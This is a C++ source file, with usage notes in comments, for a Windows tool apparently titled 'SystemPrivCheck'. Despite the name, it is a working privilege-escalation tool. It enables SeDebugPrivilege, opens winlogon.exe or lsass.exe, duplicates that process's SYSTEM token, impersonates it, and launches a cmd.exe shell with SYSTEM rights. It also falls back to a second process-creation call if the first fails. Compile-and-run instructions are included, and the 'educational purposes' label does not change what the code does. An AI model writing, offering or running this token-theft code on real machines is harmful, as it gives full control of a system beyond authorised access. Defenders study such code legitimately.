//The application follows these steps:

//1.	Check Administrator Status: First, it verifies the process is running with Administrator privileges:
//•	Opens the current process token
//•	Retrieves the token elevation information
//•	Confirms the token is elevated (running as Administrator)

//2.	Check Current Privileges: Next, it checks if the process is already running with SYSTEM privileges by:
//•	First attempting to open the thread token (for impersonation)
//•	If no thread token exists, falls back to opening the process token
//•	Gets the SID of the token owner
//•	Comparing it to the well-known SYSTEM SID (S-1-5-18)

//3.	Enable Debug Privilege: Enables the SeDebugPrivilege which is required to access system processes:
//•	Opens the current process token with TOKEN_ADJUST_PRIVILEGES rights
//•	Looks up the LUID for the SeDebugPrivilege
//•	Adjusts the token to enable this privilege

//4.	Find a SYSTEM Process: Locates a process running as SYSTEM (usually winlogon.exe or lsass.exe):
//•	Uses CreateToolhelp32Snapshot to enumerate processes
//•	Looks for winlogon.exe or lsass.exe which typically run as SYSTEM

//5.	Token Impersonation:
//•	Opens the SYSTEM process
//•	Gets its token
//•	Duplicates the token to create an impersonation token with SecurityImpersonation level
//•	Sets the current thread token to the impersonation token using SetThreadToken

//6.	Verify Success: Checks if the impersonation was successful by:
//•	Examining the thread token (not the process token)
//•	Verifying the token's SID matches the SYSTEM SID
//•	Displaying detailed token information for diagnostic purposes

//How to Compile and Use
//1.	Create a new Visual Studio C++ Console Application project
//2.	Replace the generated code with the code above
//3.	Configure project properties:
//•	Set Character Set to "Use Unicode Character Set"
//•	Ensure you're linking with advapi32.lib (add to additional dependencies if needed)
//4.	Compile the program
//5.	Run the resulting executable as Administrator

//Important Notes
//•	The program must be run as Administrator to enable debug privilege
//•	The application performs thread-level impersonation, not process-level elevation
//•	Thread impersonation means only operations performed by the current thread will have SYSTEM privileges
//•	For SYSTEM verification, both thread and process tokens are checked appropriately
//•	This technique uses legitimate Windows API calls but requires high privileges
//•	The code demonstrates token impersonation without modifying memory like Mimikatz does
//•	This is for educational purposes to understand privilege elevation mechanisms
//•	The code reverts privileges before exiting using RevertToSelf()
//This implementation focuses on the token impersonation technique which is cleaner and more straightforward than modifying credentials in memory.
//It's meant as a standalone utility that clearly shows when it's running with SYSTEM privileges.


/*
 * SystemPrivCheck - A utility to verify and obtain SYSTEM privileges
 * Based on token impersonation techniques
 */
#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <sddl.h>

#define SYSTEM_SID L"S-1-5-18"

 // Get process ID by name
DWORD GetProcessIdByName(const wchar_t* processName) {
    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(PROCESSENTRY32W);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, processName) == 0) {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        } while (Process32NextW(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return 0;
}

// Check if the current process or thread has SYSTEM privileges
BOOL IsCurrentProcessSystem() {
    HANDLE hToken = NULL;
    BOOL isSystem = FALSE;

    // First try to get the thread token (for thread impersonation)
    if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken)) {
        // Successfully opened thread token - we're impersonating
        wprintf(L"[*] Checking thread token for SYSTEM privileges...\n");
    }
    else {
        // No thread token, fallback to process token
        DWORD error = GetLastError();
        if (error != ERROR_NO_TOKEN) {
            wprintf(L"[!] Failed to open thread token: %d\n", error);
        }

        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            wprintf(L"[!] Failed to open process token: %d\n", GetLastError());
            return FALSE;
        }
        wprintf(L"[*] Checking process token for SYSTEM privileges...\n");
    }

    // Now get the token information
    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        CloseHandle(hToken);
        return FALSE;
    }

    PTOKEN_USER pTokenUser = (PTOKEN_USER)LocalAlloc(LPTR, dwSize);
    if (!pTokenUser) {
        CloseHandle(hToken);
        return FALSE;
    }

    if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
        LocalFree(pTokenUser);
        CloseHandle(hToken);
        return FALSE;
    }

    LPWSTR strSid = NULL;
    if (ConvertSidToStringSidW(pTokenUser->User.Sid, &strSid)) {
        wprintf(L"[*] Token SID: %s\n", strSid);
        isSystem = (wcscmp(strSid, SYSTEM_SID) == 0);
        LocalFree(strSid);
    }

    LocalFree(pTokenUser);
    CloseHandle(hToken);

    return isSystem;
}


// Try to enable SeDebugPrivilege for the current process
BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        wprintf(L"[!] OpenProcessToken error: %d\n", GetLastError());
        return FALSE;
    }

    if (!LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid)) {
        wprintf(L"[!] LookupPrivilegeValue error: %d\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    DWORD error = GetLastError();
    CloseHandle(hToken);

    if (!result || error != ERROR_SUCCESS) {
        wprintf(L"[!] AdjustTokenPrivileges error: %d\n", error);
        return FALSE;
    }

    return TRUE;
}

BOOL ImpersonateSystem() {
    // First, enable debug privilege to be able to open system processes
    if (!EnableDebugPrivilege()) {
        wprintf(L"[!] Failed to enable debug privilege.\n");
        return FALSE;
    }

    // Get winlogon.exe or another SYSTEM process
    DWORD pid = GetProcessIdByName(L"winlogon.exe");
    if (pid == 0) {
        pid = GetProcessIdByName(L"lsass.exe");
        if (pid == 0) {
            wprintf(L"[!] Failed to find a suitable SYSTEM process\n");
            return FALSE;
        }
    }

    // Open the process
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) {
        wprintf(L"[!] Failed to open SYSTEM process (pid: %d): %d\n", pid, GetLastError());
        return FALSE;
    }

    // Open its token
    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken)) {
        wprintf(L"[!] Failed to open process token: %d\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    // Duplicate the token - must use TokenImpersonation for SetThreadToken
    HANDLE hDupToken;
    if (!DuplicateTokenEx(hToken,
        TOKEN_IMPERSONATE | TOKEN_QUERY,
        NULL,
        SecurityImpersonation,
        TokenImpersonation,  // Changed back to TokenImpersonation
        &hDupToken)) {
        wprintf(L"[!] Failed to duplicate token: %d\n", GetLastError());
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Set thread token (using impersonation)
    if (!SetThreadToken(NULL, hDupToken)) {
        wprintf(L"[!] Failed to set thread token: %d\n", GetLastError());
        CloseHandle(hDupToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Print the detailed token information
    wprintf(L"[*] Token information after impersonation:\n");

    DWORD retLen;
    TOKEN_TYPE tokenType;
    if (GetTokenInformation(hDupToken, TokenType, &tokenType, sizeof(tokenType), &retLen)) {
        wprintf(L"[*] Token type: %s\n", tokenType == TokenPrimary ? L"Primary" : L"Impersonation");
    }

    SECURITY_IMPERSONATION_LEVEL impLevel;
    if (GetTokenInformation(hDupToken, TokenImpersonationLevel, &impLevel, sizeof(impLevel), &retLen)) {
        wprintf(L"[*] Impersonation level: ");
        switch (impLevel) {
        case SecurityAnonymous: wprintf(L"Anonymous\n"); break;
        case SecurityIdentification: wprintf(L"Identification\n"); break;
        case SecurityImpersonation: wprintf(L"Impersonation\n"); break;
        case SecurityDelegation: wprintf(L"Delegation\n"); break;
        default: wprintf(L"Unknown (%d)\n", impLevel);
        }
    }

    CloseHandle(hDupToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);

    return TRUE;
}



// Check if the current process is running with Administrator privileges
BOOL IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    HANDLE hToken = NULL;

    // Get the process token
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        wprintf(L"[!] Failed to open process token: %d\n", GetLastError());
        return FALSE;
    }

    // Allocate memory for the token elevation information
    TOKEN_ELEVATION elevation;
    DWORD dwSize = sizeof(TOKEN_ELEVATION);

    // Get the token elevation information
    if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
        isAdmin = elevation.TokenIsElevated;
    }

    if (hToken) {
        CloseHandle(hToken);
    }

    return isAdmin;
}

// Launch a new command prompt with the SYSTEM token
// Launch a new command prompt with the SYSTEM token
BOOL LaunchSystemCommandPrompt() {
    HANDLE hToken;
    DWORD pid = GetProcessIdByName(L"winlogon.exe");
    if (pid == 0) {
        pid = GetProcessIdByName(L"lsass.exe");
        if (pid == 0) {
            wprintf(L"[!] Failed to find a suitable SYSTEM process\n");
            return FALSE;
        }
    }

    // Open the SYSTEM process
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) {
        wprintf(L"[!] Failed to open SYSTEM process (pid: %d): %d\n", pid, GetLastError());
        return FALSE;
    }

    // Open its token
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken)) {
        wprintf(L"[!] Failed to open process token: %d\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    // Duplicate the token as a primary token (required for creating processes)
    HANDLE hDupToken;
    if (!DuplicateTokenEx(hToken,
        TOKEN_ALL_ACCESS,
        NULL,
        SecurityImpersonation,
        TokenPrimary, // PRIMARY token required for CreateProcessWithTokenW
        &hDupToken)) {
        wprintf(L"[!] Failed to duplicate token: %d\n", GetLastError());
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Prepare to launch the process
    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi;

    // Set up additional STARTUPINFO parameters for the new process
    si.lpDesktop = const_cast<LPWSTR>(L"Winsta0\\Default"); // Default desktop
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;

    // Command line argument - cmd.exe
    // Use a modifiable buffer as required by CreateProcessXXX functions
    WCHAR cmdLine[MAX_PATH] = L"cmd.exe";

    // Create the new process with the SYSTEM token
    if (!CreateProcessWithTokenW(
        hDupToken,             // Token to use
        0,                     // No special logon flags
        NULL,                  // Use the command from lpCommandLine
        cmdLine,               // Command line (modifiable buffer)
        CREATE_NEW_CONSOLE,    // Create a new console window
        NULL,                  // Use parent's environment block
        NULL,                  // Use parent's starting directory
        &si,                   // Startup info
        &pi                    // Process information
    )) {
        DWORD error = GetLastError();
        wprintf(L"[!] Failed to create process with SYSTEM token: %d\n", error);

        // Check if we need the assignment privilege
        if (error == ERROR_PRIVILEGE_NOT_HELD) {
            wprintf(L"[!] Missing required privilege. Trying to enable SeAssignPrimaryTokenPrivilege...\n");

            // Try to enable the privilege
            HANDLE hProcessToken;
            if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hProcessToken)) {
                TOKEN_PRIVILEGES tp;
                LUID luid;

                if (LookupPrivilegeValueW(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &luid)) {
                    tp.PrivilegeCount = 1;
                    tp.Privileges[0].Luid = luid;
                    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

                    AdjustTokenPrivileges(hProcessToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);

                    // Try again with the privilege enabled
                    if (CreateProcessWithTokenW(hDupToken, 0, NULL, cmdLine, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
                        wprintf(L"[+] Successfully launched cmd.exe with SYSTEM privileges!\n");
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);
                        CloseHandle(hProcessToken);
                        CloseHandle(hDupToken);
                        CloseHandle(hToken);
                        CloseHandle(hProcess);
                        return TRUE;
                    }
                }
                CloseHandle(hProcessToken);
            }

            // If we're still here, try CreateProcessAsUser as an alternative
            wprintf(L"[!] Trying alternate method with CreateProcessAsUserW...\n");
            if (CreateProcessAsUserW(
                hDupToken,
                NULL,
                cmdLine,
                NULL,
                NULL,
                FALSE,
                CREATE_NEW_CONSOLE,
                NULL,
                NULL,
                &si,
                &pi)) {
                wprintf(L"[+] Successfully launched cmd.exe with SYSTEM privileges using CreateProcessAsUserW!\n");
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                CloseHandle(hDupToken);
                CloseHandle(hToken);
                CloseHandle(hProcess);
                return TRUE;
            }
            else {
                wprintf(L"[!] Failed to create process with CreateProcessAsUserW: %d\n", GetLastError());
            }
        }

        CloseHandle(hDupToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Process created successfully
    wprintf(L"[+] Successfully launched cmd.exe with SYSTEM privileges!\n");

    // Clean up handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hDupToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);

    return TRUE;
}



int wmain(int argc, wchar_t* argv[]) {
    wprintf(L"System Privilege Check Tool\n");
    wprintf(L"==========================\n\n");

    // First check if we're already running as SYSTEM
    if (IsCurrentProcessSystem()) {
        wprintf(L"[+] Already running with SYSTEM privileges!\n");
        wprintf(L"[*] Launching a command prompt with SYSTEM privileges...\n");
        LaunchSystemCommandPrompt();
        return 0;
    }

    wprintf(L"[*] Current process is not running as SYSTEM\n");

    // Check if running as admin before attempting to elevate
    if (!IsRunningAsAdmin()) {
        wprintf(L"[!] This application requires Administrator privileges.\n");
        wprintf(L"[!] Please restart the application as Administrator.\n");
        return 1;
    }

    wprintf(L"[+] Running with Administrator privileges\n");
    wprintf(L"[*] Attempting to acquire SYSTEM privileges...\n");

    // Try to impersonate SYSTEM
    if (ImpersonateSystem()) {
        // Check if impersonation worked
        if (IsCurrentProcessSystem()) {
            wprintf(L"[+] Successfully acquired SYSTEM privileges through impersonation!\n");

            // Launch a command prompt with SYSTEM privileges
            wprintf(L"[*] Launching a command prompt with SYSTEM privileges...\n");
            LaunchSystemCommandPrompt();

            // Revert to self before exiting
            RevertToSelf();
            return 0;
        }
        else {
            wprintf(L"[!] Impersonation apparently succeeded, but not running as SYSTEM.\n");
            RevertToSelf();
        }
    }
    else {
        wprintf(L"[!] Failed to acquire SYSTEM privileges.\n");
    }

    wprintf(L"[*] Press Enter to exit...\n");
    getchar();
    return 1;
}


